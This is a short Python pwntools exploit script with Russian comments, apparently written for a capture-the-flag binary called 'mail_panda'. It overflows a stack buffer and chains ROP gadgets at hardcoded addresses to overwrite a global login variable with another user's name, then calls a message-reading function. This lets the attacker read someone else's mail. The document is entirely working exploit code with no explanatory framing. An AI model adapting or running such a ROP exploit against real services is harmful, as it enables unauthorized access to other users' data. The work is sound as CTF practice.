from pwn import *

# Смещение
offset = 0x90 + 8

login_global = 0x0000000000404160   #login
gat_init = 0x0000000000401520
gat_pop = 0x0000000000401524
gat_mov = 0x0000000000401526 # mov [rsi+rdi*8], rax
gat_inc = 0x000000000040152B
get_mes = 0x00000000004018B6
# Формируем полезную нагрузку
# payload = cyclic(300)
name = b"melinda44B8582B\0" # наш логин, на который хотим подписаться

payload = b"01\0"+ b"A" * (offset-3) 
# gat


payload += p64(gat_init)
payload += p64(0)           #rdi
payload += p64(login_global)#rsi 
payload += p64(0)           #мусор

for i in range(0, len(name), 8):
    batch = name[i:i+8]
    payload += p64(gat_pop) # pop rax
    payload += p64(int.from_bytes(batch, byteorder="little")) 
    payload += p64(gat_mov) 
    payload += p64(gat_inc) # на след ячейку

payload += p64(gat_inc) # выранивание стека
payload += p64(get_mes) 
# Подключаемся к сервису
conn = process("./mail_panda")
input("hello")
conn.sendline(payload)
conn.interactive()

